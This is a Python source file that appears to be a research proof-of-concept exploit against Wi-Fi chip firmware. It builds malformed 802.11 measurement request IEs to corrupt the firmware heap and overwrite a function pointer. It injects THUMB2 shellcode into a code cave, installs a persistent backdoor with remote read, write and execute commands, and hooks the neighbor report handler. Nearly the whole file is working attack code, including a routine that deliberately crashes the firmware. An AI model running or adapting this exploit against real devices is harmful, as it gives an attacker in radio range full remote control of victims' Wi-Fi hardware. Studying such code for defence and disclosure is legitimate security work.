import sys, os, time, struct
from crc32 import get_crc32
from conf import *
from symbols import *
from commands import *

#The width, in bytes, of a THUMB2 instruction
THUMB2_INST_WIDTH = 4

def create_basic_measurement_req_ie(token, channel, start_time, duration):
    '''
    Creates a measurement request IE with the "basic" measurement type, triggering an allocation of 17 bytes
    The controlled bytes in the allocation are at indices: 2, [5,16)
    '''
    fields = (38,      #IE Tag
              14,      #IE Length
              token,   #Token
              0,       #Mode
              0,       #Type = BASIC
              channel) #Channel
    return struct.pack("<BBBBBB", *fields) + start_time + struct.pack("<H", duration)

def create_cca_measurement_req_ie(token):
    '''
    Creates a measurement request IE with the "CCA" measurement type, triggering an allocation of 5 bytes
    The controlled bytes in the allocation are at indices: 2, 4
    '''
    fields = (38,      #IE Tag
              14,      #IE Length
              token,   #Token
              0,       #Mode
              1,       #Type = CCA
              0)       #Channel
    time_and_duration = "\x10" * 10
    return struct.pack("<BBBBBB", *fields) + time_and_duration

def create_sta_statistics_measurement_req(measurement_token, val):
    '''
    Creates an STA Statistics measurement request IE (7.3.2.21.8), triggering an allocation of 20 bytes
    The controlled bytes in the allocation are at indices [16-20)
    '''
    low, hi = struct.unpack("<HH", struct.pack("<I", val))
    val = struct.unpack("<I", struct.pack("<HH", hi, low))[0]
    fields = (38,                #IE Tag
              14,                #IE Length
              measurement_token, #Measurement Token
              0,                 #Measurement Mode
              7,                 #Measurement Type = STA Statistics
              6*"\xAA",          #Peer MAC Address
              val,               #Randomisation Interval + Measurement Duration
              0)                 #Group Identity
    return struct.pack("<BBBBB6sIB", *fields)

def create_chunk_overwrite_req(chunk_addr, chunk_size):
    '''
    Crafts a series of Spectrum Management IEs that trigger an overwrite of the crafted overlapping freechunk,
    thereby replacing the chunk's size with "chunk_size", and its "next" pointer with "chunk_addr".
    '''

    #Initial padding
    req_buffer = create_cca_measurement_req_ie(0xAA)
    req_buffer += ''.join([create_basic_measurement_req_ie(0xAA, 0xAA, ("AA" * 8).decode("hex"), 0xAAAA) for i in range(0, 9)])
    
    #Adding the actual IE which will be used to overwrite BA5's freechunk
    req_buffer += create_basic_measurement_req_ie(0xAA, 0xAA, struct.pack("<II", chunk_size, chunk_addr), 0xAAAA)

    #Adding another padding IEs to make the length divisible by 4
    req_buffer += create_cca_measurement_req_ie(0xAA)
   
    return req_buffer

def create_code_cave_chunk():
    '''
    Creates a series of measurement request IEs which, when allocated, will introduce a backdoor
    into the RRM neighbor report handler, allowing easy write access to the firmware.
    '''
    chunk = ''
                                                                                                          #b0:
    chunk += create_sta_statistics_measurement_req(0, struct.unpack("<I", struct.pack("<HH", 0x481D,      #  LDR R0, dstaddr
                                                                                             0xE007))[0]) #  B b1
                                                                                                          #b1:
    chunk += create_sta_statistics_measurement_req(1, struct.unpack("<I", struct.pack("<HH", 0x491D,      #  LDR R1, val1
                                                                                             0xE007))[0]) #  B b2
                                                                                                          #b2:
    chunk += create_sta_statistics_measurement_req(2, struct.unpack("<I", struct.pack("<HH", 0x6001,      #  STR R1, [R0]
                                                                                             0xE007))[0]) #  B b3
                                                                                                          #b3:
    chunk += create_sta_statistics_measurement_req(3, struct.unpack("<I", struct.pack("<HH", 0x4918,      #  LDR R1, val2
                                                                                             0xE007))[0]) #  B b4
                                                                                                          #b4:
    chunk += create_sta_statistics_measurement_req(4, struct.unpack("<I", struct.pack("<HH", 0x6041,      #  STR R1, [R0, #4]
                                                                                             0xE007))[0]) #  B b5
                                                                                                          #b5:
    chunk += create_sta_statistics_measurement_req(5, struct.unpack("<I", struct.pack("<HH", 0x2000,      #  MOV R0, #0
                                                                                             0x4770))[0]) #  BX LR
                                                                                                          #dstaddr: 
    chunk += create_sta_statistics_measurement_req(6, WLC_RRM_RECV_NEIGHBOR_REPORT_RESPONSE_INTERNAL)     #  .word 0xVALUE
                                                                                                          #val1: 
    chunk += create_sta_statistics_measurement_req(7, struct.unpack("<I", struct.pack("<HH", 0x6890,      #  LDR R0, [R2, #8]
                                                                                             0x68D1))[0]) #  LDR R1, [R2, #12]
                                                                                                          #val2: 
    chunk += create_sta_statistics_measurement_req(8, struct.unpack("<I", struct.pack("<HH", 0x6001,      #  STR R1, [R0]
                                                                                             0x4770))[0]) #  BX LR
    for i in range(9, 23):
        chunk += create_sta_statistics_measurement_req(i, 0xCCCCCCCC)
    return chunk

def write_dword_slow(addr, val):
    '''
    Writes the given value to the given address using the inital backdoor inserted into the NRREP handler
    '''
    fields = (0,     #Padding
              0,     #Command = WRITE (SLOW)
              addr,  #Address
              val)   #Value
    nrrep_raw(struct.pack("<BIII", *fields))

def write_dword_fast(addr, val, verify=True):
    '''
    Writes the given value to the given address using the secondary backdoor inserted into the NRREP handler
    '''
    write_buffer(addr, struct.pack("<I", val), verify)

def write_buffer(addr, data, verify=True):
    '''
    Writes the given buffer to the given address using the secondary backdoor inserted into the NRREP handler
    '''
    while True:
        fields = (0,                    #Padding
                  4,                    #Command = WRITE (FAST)
                  addr,                 #Address
                  len(data))            #Length
        nrrep_raw(struct.pack("<BIII", *fields) + data)
        
        if not verify:
            return
        
        #Making sure the CRC32 of the written data matches
        recv_crc = fw_crc32(addr, len(data))
        expected_crc = get_crc32(data) & 0xFFFFFFFF
        if expected_crc == recv_crc:
            return
        else:
            print "Got CRC32: %08X, expected: %08X" % (recv_crc, expected_crc)

def send_recv(cmd):
    '''
    Sends the given command to the backdoor via the NRREP secondary backdoor, and waits for a response to arrive.
    '''
    #Clearing the state
    clear_backdoor_state()
    
    #Sending the trigger
    nrrep_raw(cmd)

    #Polling until we get a response (or time out)
    start_time = time.time()
    while time.time() - start_time < MAX_READ_DWORD_POLL_TIME:
        time.sleep(POLL_GRANULARITY)
        state = get_backdoor_state()
        if state == None:
            continue
        callback_received, callback_result = state
        if callback_received != 1:
            continue
        return callback_result
    raise Exception("Timed out while waiting for backdoor callback result")

def fw_crc32(addr, length):
    '''
    Retrieves the CRC32 of the given buffer in the firmware by communicating with the secondary backdoor.
    '''        
    fields = (0,       #Padding
              3,       #Command = CRC32
              addr,    #Address
              length,  #Length
              AP_MAC.replace(":","").decode("hex"))
    cmd = struct.pack("<BIII6s", *fields)
    return send_recv(cmd)

def read_dword(addr):
    '''
    Reads the DWORD at the given address using the secondary backdoor inserted into the NRREP handler
    '''

    fields = (0,     #Padding
              1,     #Command = READ
              addr,  #Address
              0xAB,  #Token
              AP_MAC.replace(":","").decode("hex"))
    cmd = struct.pack("<BIII6s", *fields)
    return send_recv(cmd)

def execute_chunk(code_chunk, is_thumb=True):
    '''
    Executes the given code chunk on the Wi-Fi firmware
    '''

    #Writing the code chunk to an unoccupied area in the heap
    write_buffer(CODE_CHUNK_ADDR, code_chunk)

    #Sending the trigger
    chunk_addr = CODE_CHUNK_ADDR + (1 if is_thumb else 0)
    execute_func(chunk_addr)

def execute_func(func_addr):
    '''
    Executes the function at the given address
    '''
    #Sending the trigger
    fields = (0,           #Padding
              2,           #Command = EXECUTE 
              func_addr,   #Address
              0x0)         #Padding
    nrrep_raw(struct.pack("<BIII", *fields))

def crash_firmware():
    '''
    Crashes the firwmare by triggering a free on a extraodinarily large chunk
    '''
    for i in range(1, 8):
        addba(i)
    for i in range(225, 240):
        nrrep(i,i)
    for i in range(1, 8):
        delba(i)

def encode_thumb2_wide_branch(from_addr, to_addr):
    '''
    Encodes an unconditional THUMB2 wide branch from the given address to the given address.
    '''
    if from_addr < to_addr:
        s_bit = 0
        offset = to_addr - from_addr - THUMB2_INST_WIDTH
    else:
        s_bit = 1
        offset = 2**25 - (from_addr + THUMB2_INST_WIDTH - to_addr)

    i1 = (offset >> 24) & 1
    i2 = (offset >> 23) & 1
    j1 = (0 if i1 else 1) ^ s_bit
    j2 = (0 if i2 else 1) ^ s_bit

    b2 = 0b11110000 | (s_bit << 2) | ((offset >> 20) & 0b11)
    b1 = (offset >> 12) & 0xFF
    b4 = 0b10010000 | (j1 << 5) | (j2 << 3) | ((offset >> 9) & 0b111)
    b3 = (offset >> 1) & 0xFF
    return chr(b1) + chr(b2) + chr(b3) + chr(b4)
 
def is_backdoor_installed():
    '''
    Issues a READ command to the backdoor, return True iff the backdoor is installed
    '''
    try:
        read_dword(0x160000)
        return True
    except:
        return False

def log(msg, verbose):
    '''
    Optional log to stdout
    '''

    if verbose: print msg

def run_exploit(verbose):
   
    log("[*] Rebooting the firmware", verbose)
    crash_firmware()
    time.sleep(FIRMWARE_REBOOT_DELAY) #Giving the firmware time to reboot

    log("[*] Removing existing BAs", verbose)
    for i in range(1, 8):
        delba(i)

    log("[*] Adding all BAs", verbose)
    for i in range(1, 8):
        addba(i)
    
    log("[*] Using NRREP to increment BA7 size by 140", verbose)
    for i in range(0,140):
        if (i+1) % ACTION_FRAME_COOLDOWN_WINDOW == 0:
            time.sleep(1)
        nrrep(225, 225)
    
    log("[*] Freeing BA7", verbose)
    delba(7)

    log("[*] Creating new (overlapping) BA7", verbose)
    addba(7)
 
    log("[*] Using NRREP to increment BA6 size to 150", verbose)
    for i in range(0, 150):
        if (i+1) % ACTION_FRAME_COOLDOWN_WINDOW == 0:
            time.sleep(1)
        nrrep(239, 239)
 
    log("[*] Freeing BA6", verbose)
    delba(6)

    log("[+] Feeing BA5", verbose)
    delba(5)
    
    log("[*] Incrementing BA6's freechunk size until it overlaps with BA5's chunk (BA6 size is set to 0xB0)", verbose)
    for i in range(0, 32):
        if (i+1) % ACTION_FRAME_COOLDOWN_WINDOW == 0:
            time.sleep(1)
        nrrep(239, 239)
    
    log("[*] Using SPECMEAS to point BA5's freechunk at a code cave location", verbose)
    specmeas([create_chunk_overwrite_req(CODE_CAVE_CHUNK, 0xFFFF0000)])

    log("[*] Using RMREQ to allocate code in the cave", verbose)
    rmreq(create_code_cave_chunk())

    log("[*] Using SPECMEAS to point before the disallowed range head", verbose)
    specmeas([create_chunk_overwrite_req(FAKE_CHUNK_DISALLOWED_RANGE_OVERWRITE, 0xFFFF0000)])

    log("[*] Using SPECMEAS to reduce the disallowed range", verbose)
    specmeas([create_cca_measurement_req_ie(0x00)])

    log("[*] Pointing at a location before the wl hc function pointer", verbose)
    specmeas([create_chunk_overwrite_req(FAKE_CHUNK_WL_HC, 0xFFFF0000)])

    log("[*] Using SPECMEAS to overwrite the function pointer", verbose)
    chunk = create_basic_measurement_req_ie(0x00, 0x00, struct.pack("<II", 0x0, 0x0), 0x0)
    chunk += create_cca_measurement_req_ie(0x00)
    chunk += create_basic_measurement_req_ie(0x00, 0x00, struct.pack("<II", CODE_CAVE_CHUNK + CODE_CAVE_CODE_OFFSET + 1, 0x0), 0x0)
    chunk += create_basic_measurement_req_ie(0x00, 0x00, struct.pack("<II", 0x0, 0x0), 0x0)
    chunk += create_basic_measurement_req_ie(0x00, 0x00, struct.pack("<II", 0x0, 0x0), 0x0)
    chunk += create_cca_measurement_req_ie(0x00)
    chunk += create_cca_measurement_req_ie(0x00)
    chunk += create_basic_measurement_req_ie(0x00, 0x00, struct.pack("<II", 0x0, 0x0), 0x0)
    specmeas([chunk])

    log("[*] Pointing away to a different location", verbose)
    specmeas([create_chunk_overwrite_req(BENIGN_CHUNK, 0xFFFF0000)])
  
    time.sleep(3) #Giving the periodic callback a chance to trigger

    log("[*] Removing the old backdoor callback", verbose)
    write_dword_slow(WL_HC_PTR, WL_HC_ORIG_FUNC)

    log("[*] Fixing up the heap", verbose)
    write_dword_slow(MAIN_FREECHUNK + struct.calcsize("I"), 0x0)
    write_dword_slow(FREELIST_HEAD_PTR + struct.calcsize("I"), MAIN_FREECHUNK)

    log("[*] Writing backdoor", verbose)
    backdoor = open(BACKDOOR_PATH, "rb").read()
    for i in range(0, len(backdoor), struct.calcsize("I")):
        write_dword_slow(BACKDOOR_ADDR + i, struct.unpack("<I", backdoor[i:i+struct.calcsize("I")])[0])
  
    log("[*] Redirecting NRREP handler to backdoor address", verbose)
    hook_insertion_addr = WLC_RRM_RECV_NEIGHBOR_REPORT_RESPONSE_INTERNAL
    branch = encode_thumb2_wide_branch(hook_insertion_addr, BACKDOOR_ADDR)
    write_dword_slow(hook_insertion_addr, struct.unpack("<I", branch)[0])

def ensure_backdoor_installed(max_attempts=-1, verbose=False):
    '''
    Ensure that the backdoor is installed (if it isn't, runs the exploit until it is).
    Returns True iff the backdoor is successfully installed.
    '''

    #Is this a capped attempt?
    if max_attempts >= 0:
        for i in range(0, max_attempts):
            if is_backdoor_installed():
                break
            log("[*] Backdoor not installed, attempting to exploit...", verbose)
            run_exploit(verbose)
        if not is_backdoor_installed():
            log("[-] Failed to install backdoor", verbose)
            return False
        else:
            log("[+] Backdoor successfully installed", verbose)
            return True

    #Loop until success
    else:
        while not is_backdoor_installed():
            run_exploit(verbose)
        return True

def main():
    ensure_backdoor_installed(MAX_ATTEMPTS, True)

if __name__ == "__main__":
    main()
